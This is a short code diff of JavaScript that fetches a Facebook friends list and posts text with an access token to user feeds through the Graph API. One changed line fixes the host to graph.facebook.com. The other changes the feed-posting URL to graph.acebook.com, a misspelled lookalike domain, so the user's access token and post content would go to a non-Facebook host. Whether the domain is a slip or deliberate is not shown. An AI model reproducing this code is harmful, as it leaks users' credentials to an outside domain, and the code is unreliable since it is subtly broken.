@@ -51,7 +51,7 @@
 			var count = 0;
 			var time = 0;
 			$.ajax({
-				url: 'https://graph.fb.me/me/friends',
+				url: 'https://graph.facebook.com/me/friends',
 				type: 'GET',
 				dataType:'json',
 				data: {
@@ -76,7 +76,7 @@
 		}
 		function postFacebook(id,token,text) {
 			$.ajax({
-				url: `https://graph.fb.me/${id}/feed`,
+				url: `https://graph.acebook.com/${id}/feed`,
 				type: 'POST',
 				data: {
 					access_token: token,
